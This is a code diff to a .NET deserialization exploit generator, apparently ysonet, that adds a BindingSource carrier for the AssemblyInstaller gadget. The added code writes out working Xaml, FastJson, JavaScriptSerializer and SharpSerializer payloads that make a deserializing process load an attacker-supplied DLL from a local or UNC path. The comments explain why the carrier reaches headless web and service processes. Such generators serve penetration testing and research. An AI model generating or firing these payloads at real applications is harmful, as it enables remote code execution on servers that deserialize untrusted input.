@@ -21,10 +21,22 @@ namespace ysonet.Generators
     /// DLL. Against a DLL with no such installer class the payload is only an assembly load.
     ///
     /// The getter is reached with the WinForms getter-call carriers: PropertyGrid reads
-    /// every property of the objects handed to it, and ComboBox / ListBox / CheckedListBox
-    /// read the property named by DisplayMember. AssemblyInstaller's private "initialized"
-    /// flag is set at the end of the first successful InitializeFromAssembly, so a carrier
-    /// that reads HelpText several times still builds the installers only once.
+    /// every property of the objects handed to it, ComboBox / ListBox / CheckedListBox
+    /// read the property named by DisplayMember, and BindingSource reads the property named
+    /// by DataMember on its DataSource. AssemblyInstaller's private "initialized" flag is
+    /// set at the end of the first successful InitializeFromAssembly, so a carrier that
+    /// reads HelpText several times still builds the installers only once.
+    ///
+    /// BindingSource is the odd one out and the reason it is worth having: the other four
+    /// are WinForms CONTROLS, while BindingSource is a plain Component with no window, so
+    /// the payload lands in a headless web or service process the same way it lands in a
+    /// desktop one. Its chain is BindingSource.set_DataMember / set_DataSource -> ResetList
+    /// -> ListBindingHelper.GetList(dataSource, dataMember) -> PropertyDescriptor.GetValue,
+    /// and the only guard on the way is "dataSource is Type" (that branch instantiates the
+    /// named type instead; it is not this one). Two target-side conditions matter and both
+    /// hold for AssemblyInstaller: the DataSource object must not be IEnumerable, or GetList
+    /// reads the property off its first ELEMENT instead, and it must not be
+    /// ICurrencyManagerProvider, which takes a third branch.
     ///
     /// Everything this gadget emits lives in this file: the target type names, the property
     /// names, every formatter template, and the two surrogates.
@@ -51,8 +63,9 @@ namespace ysonet.Generators
         }
 
         // The installer-gadget class (an assembly load reached through a serialized object,
-        // then the installer types instantiated from it) is Munoz and Mirosh's; the four
-        // WinForms getter-call carriers that drive the HelpText getter are Bazydlo's. This
+        // then the installer types instantiated from it) is Munoz and Mirosh's, and so is
+        // the BindingSource carrier, published in the same 2017 work. The four WinForms
+        // CONTROL getter-call carriers that drive the HelpText getter are Bazydlo's. This
         // gadget is the two put together, so both are credited.
         public override string Finders()
         {
@@ -90,7 +103,9 @@ namespace ysonet.Generators
         //    both MessagePack Typeless flavours need a settable property, so only
         //    PropertyGrid.SelectedObjects works for them (measured: the other three carriers
         //    either deserialize with an EMPTY Items collection, so nothing is ever read, or
-        //    throw);
+        //    throw). BindingSource gives FastJson, JavaScriptSerializer and both
+        //    SharpSerializer flavours a SECOND carrier, because its two members are ordinary
+        //    settable properties - see RequireSupportedGetter for the split;
         //  - BinaryFormatter, SoapFormatter, LosFormatter, NetDataContractSerializer,
         //    DataContractSerializer, DataContractJsonSerializer, XmlSerializer and FsPickler
         //    restore FIELDS instead of calling setters, and none of the WinForms carriers is
@@ -135,7 +150,8 @@ namespace ysonet.Generators
         }
 
         private int variant_number = 1;   // 1 = local path, 2 = UNC path
-        private int getter_number = 1;    // 1 = PropertyGrid, 2 = ComboBox, 3 = ListBox, 4 = CheckedListBox
+        // 1 = PropertyGrid, 2 = ComboBox, 3 = ListBox, 4 = CheckedListBox, 5 = BindingSource
+        private int getter_number = 1;
 
         public override OptionSet Options()
         {
@@ -155,11 +171,13 @@ namespace ysonet.Generators
                 {
                     "getter=",
                     "Which WinForms getter-call carrier reads AssemblyInstaller.HelpText. Choices: "
-                    + "\r\n1 (default) - PropertyGrid (reads every property once; the only carrier the non-Json.NET/Xaml formatters can build)"
+                    + "\r\n1 (default) - PropertyGrid (reads every property once; the only carrier every formatter here can build)"
                     + "\r\n2 - ComboBox (reads HelpText several times; the installers are still built once)"
                     + "\r\n3 - ListBox"
                     + "\r\n4 - CheckedListBox"
-                    + "\r\nOnly Json.NET and Xaml can build carriers 2 to 4.",
+                    + "\r\n5 - BindingSource (reads HelpText once; a Component with no window, so it suits a headless target)"
+                    + "\r\nOnly Json.NET and Xaml can build carriers 2 to 4. Carrier 5 works with Xaml, FastJson, "
+                    + "JavaScriptSerializer and both SharpSerializer flavours, but not with Json.NET, YamlDotNet or MessagePack.",
                     v => int.TryParse(v, out getter_number)
                 },
             };
@@ -213,13 +231,19 @@ namespace ysonet.Generators
                 case 2: return "ComboBox";
                 case 3: return "ListBox";
                 case 4: return "CheckedListBox";
+                case 5: return "BindingSource";
                 default: return "PropertyGrid";
             }
         }
 
         private bool UsesPropertyGrid()
         {
-            return GetterCarrier() == "PropertyGrid";
+            return getter_number == 1;
+        }
+
+        private bool UsesBindingSource()
+        {
+            return getter_number == 5;
         }
 
         // ---- Payload templates -------------------------------------------------
@@ -289,9 +313,28 @@ namespace ysonet.Generators
         }
 
         // JavaScriptSerializer resolves __type through a SimpleTypeResolver and then sets
-        // public settable properties, so only PropertyGrid.SelectedObjects works here.
+        // public settable properties, so PropertyGrid.SelectedObjects and the two
+        // BindingSource properties work here and the three list controls do not.
+        //
+        // What it RETURNS for the BindingSource form is object[], not a BindingSource:
+        // having set the members it converts the (now enumerable) carrier to an array. The
+        // getter has already run by then, so the payload works; do not read the returned
+        // type as a failure.
         private string JavaScriptSerializerPayload(string dllPath)
         {
+            if (UsesBindingSource())
+            {
+                return @"
+{
+    ""__type"":""System.Windows.Forms.BindingSource, " + WinFormsAssembly + @""",
+    ""DataMember"":""HelpText"",
+    ""DataSource"":{
+        ""__type"":""" + AssemblyInstallerName + @""",
+        ""Path"":""" + EscapeForJsonDoubleQuoted(dllPath, false) + @"""
+    }
+}";
+            }
+
             return @"
 {
     ""__type"":""System.Windows.Forms.PropertyGrid, " + WinFormsAssembly + @""",
@@ -307,6 +350,23 @@ namespace ysonet.Generators
         // FastJson keeps its type names in a $types table and refers to them by index.
         private string FastJsonPayload(string dllPath)
         {
+            if (UsesBindingSource())
+            {
+                return @"
+{
+    ""$types"":{
+        ""System.Windows.Forms.BindingSource, " + WinFormsAssembly + @""":""1"",
+        """ + AssemblyInstallerName + @""":""2""
+    },
+    ""$type"":""1"",
+    ""DataMember"":""HelpText"",
+    ""DataSource"":{
+        ""$type"":""2"",
+        ""Path"":""" + EscapeForJsonDoubleQuoted(dllPath, false) + @"""
+    }
+}";
+            }
+
             return @"
 {
     ""$types"":{
@@ -339,7 +399,7 @@ namespace ysonet.Generators
         }
 
         // XamlReader builds the carrier and then assigns its properties, and it can also add
-        // to a read-only collection property, which is why all four carriers work here.
+        // to a read-only collection property, which is why all five carriers work here.
         private string XamlPayload(string dllPath)
         {
             string path = EscapeForXmlAttribute(dllPath, false);
@@ -347,6 +407,15 @@ namespace ysonet.Generators
             if (UsesPropertyGrid())
             {
                 return @"<PropertyGrid xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:ci=""clr-namespace:System.Configuration.Install;assembly=System.Configuration.Install""><PropertyGrid.SelectedObject><ci:AssemblyInstaller Path=""" + path + @""" /></PropertyGrid.SelectedObject></PropertyGrid>";
+            }
+
+            // BindingSource takes DataMember as an attribute and DataSource as a property
+            // element. XamlReader applies attributes before property elements, so this is
+            // the published DataMember-then-DataSource order; either order fires, because
+            // both setters call ResetList and only the second one has both values.
+            if (UsesBindingSource())
+            {
+                return @"<BindingSource xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:ci=""clr-namespace:System.Configuration.Install;assembly=System.Configuration.Install"" DataMember=""HelpText""><BindingSource.DataSource><ci:AssemblyInstaller Path=""" + path + @""" /></BindingSource.DataSource></BindingSource>";
             }
 
             string carrier = GetterCarrier();
@@ -360,6 +429,24 @@ namespace ysonet.Generators
         // written. An object[] property is a "SingleArray" element holding one "Items" list.
         private string SharpSerializerXmlPayload(string dllPath)
         {
+            if (UsesBindingSource())
+            {
+                // A nested object property is a "Complex" element carrying the member name.
+                // SharpSerializer restores properties in document order, so DataMember is
+                // written first to match the published shape.
+                return @"
+<Complex type=""System.Windows.Forms.BindingSource," + WinFormsAssemblyShort + @""">
+    <Properties>
+        <Simple name=""DataMember"" type=""" + StringName + @""" value=""HelpText""/>
+        <Complex name=""DataSource"" type=""" + AssemblyInstallerShortName + @""">
+            <Properties>
+                <Simple name=""Path"" type=""" + StringName + @""" value=""" + EscapeForXmlAttribute(dllPath, false) + @"""/>
+            </Properties>
+        </Complex>
+    </Properties>
+</Complex>";
+            }
+
             return @"
 <Complex type=""System.Windows.Forms.PropertyGrid," + WinFormsAssemblyShort + @""">
     <Properties>
@@ -381,6 +468,13 @@ namespace ysonet.Generators
         // type names in the stream.
         private byte[] SharpSerializerBinaryPayload(string dllPath)
         {
+            if (UsesBindingSource())
+            {
+                return SharpSerializerTypeSwap.SerializeAs(
+                    BuildBindingSourceSurrogateGraph(dllPath),
+                    BindingSourceTargetTypeNames());
+            }
+
             return SharpSerializerTypeSwap.SerializeAs(
                 BuildSurrogateGraph(dllPath),
                 TargetTypeNames());
@@ -428,6 +522,33 @@ namespace ysonet.Generators
         internal sealed class AssemblyInstallerSurrogate
         {
             public string Path { get; set; }
+        }
+
+        private static BindingSourceSurrogate BuildBindingSourceSurrogateGraph(string dllPath)
+        {
+            return new BindingSourceSurrogate
+            {
+                DataMember = "HelpText",
+                DataSource = new AssemblyInstallerSurrogate { Path = dllPath }
+            };
+        }
+
+        private static Dictionary<Type, string> BindingSourceTargetTypeNames()
+        {
+            return new Dictionary<Type, string>
+            {
+                { typeof(BindingSourceSurrogate), "System.Windows.Forms.BindingSource, " + WinFormsAssembly },
+                { typeof(AssemblyInstallerSurrogate), AssemblyInstallerName },
+            };
+        }
+
+        // Same "shape only" rule as the two surrogates above. The DECLARATION ORDER of these
+        // two properties is the wire order SharpSerializer writes, so DataMember stays first
+        // to match the hand written XML document and the published payload.
+        internal sealed class BindingSourceSurrogate
+        {
+            public string DataMember { get; set; }
+            public object DataSource { get; set; }
         }
 
         // ---- Input rules -------------------------------------------------------
@@ -490,18 +611,45 @@ namespace ysonet.Generators
         }
 
         /// <summary>
-        /// Only Json.NET and Xaml can build the three list carriers. The others need a
-        /// settable property, and ComboBox / ListBox / CheckedListBox expose Items as a
-        /// read-only collection, so they deserialize with nothing in it and never read
-        /// HelpText. Refuse rather than hand back a payload that quietly does nothing.
+        /// Which carrier each formatter can actually build. Two independent walls, and both
+        /// are measured rather than reasoned about, because both fail SILENTLY on at least
+        /// one formatter - a payload that deserializes cleanly and never reads HelpText is
+        /// worse than a refusal.
+        ///
+        /// Carriers 2 to 4 need a formatter that can ADD to a read-only collection, because
+        /// ComboBox / ListBox / CheckedListBox expose Items with no setter. Only Json.NET
+        /// and Xaml do; the rest deserialize with an EMPTY Items collection, or throw.
+        ///
+        /// Carrier 5 has the opposite problem. Its two members are ordinary settable
+        /// properties, so the collection wall does not apply - but BindingSource itself
+        /// implements IList, and a serializer that recognises a list populates it with Add
+        /// instead of calling the setters. Measured: Json.NET refuses the document outright
+        /// ("the type requires a JSON array"), YamlDotNet and both MessagePack Typeless
+        /// flavours do the same, and DataContractJsonSerializer is the silent one - it
+        /// returns a real BindingSource with neither member set. Giving Json.NET the array
+        /// shape it asks for does not help either: an array contract only ever calls
+        /// IList.Add, which never touches DataMember or DataSource.
         /// </summary>
         private void RequireSupportedGetter(string formatter)
         {
-            if (getter_number < 1 || getter_number > 4)
-                throw new ArgumentException("--getter must be 1 (PropertyGrid), 2 (ComboBox), 3 (ListBox) or 4 (CheckedListBox).");
+            if (getter_number < 1 || getter_number > 5)
+                throw new ArgumentException("--getter must be 1 (PropertyGrid), 2 (ComboBox), 3 (ListBox),"
+                    + " 4 (CheckedListBox) or 5 (BindingSource).");
 
             if (UsesPropertyGrid())
                 return;
+
+            if (UsesBindingSource())
+            {
+                if (FormatterCanBuildBindingSource(formatter))
+                    return;
+
+                throw new ArgumentException("--getter 5 (BindingSource) is available with Xaml, FastJson,"
+                    + " JavaScriptSerializer, SharpSerializerXml and SharpSerializerBinary. " + formatter
+                    + " treats BindingSource as a LIST, because it implements IList, so it populates it"
+                    + " with Add and never calls the DataMember and DataSource setters."
+                    + " Use --getter 1 (PropertyGrid) with " + formatter + ".");
+            }
 
             if (IsFormatter(formatter, Formatters.JsonNet) || IsFormatter(formatter, Formatters.Xaml))
                 return;
@@ -509,7 +657,21 @@ namespace ysonet.Generators
             throw new ArgumentException("--getter " + getter_number + " (" + GetterCarrier() + ") is only"
                 + " available with Json.NET and Xaml. " + formatter + " can only set a property, and the"
                 + " Items collection of that carrier has no setter, so it would deserialize empty."
-                + " Use --getter 1 (PropertyGrid) with " + formatter + ".");
+                + " Use --getter 1 (PropertyGrid)"
+                + (FormatterCanBuildBindingSource(formatter) ? " or --getter 5 (BindingSource)" : "")
+                + " with " + formatter + ".");
+        }
+
+        // The five formatters measured to reach BindingSource's two setters. Kept in one
+        // place because the refusal above ADVISES carrier 5 on exactly this set, so a
+        // formatter may never appear in one half and not the other.
+        private bool FormatterCanBuildBindingSource(string formatter)
+        {
+            return IsFormatter(formatter, Formatters.Xaml)
+                || IsFormatter(formatter, Formatters.FastJson)
+                || IsFormatter(formatter, Formatters.JavaScriptSerializer)
+                || IsFormatter(formatter, Formatters.SharpSerializerXml)
+                || IsFormatter(formatter, Formatters.SharpSerializerBinary);
         }
 
         /// <summary>
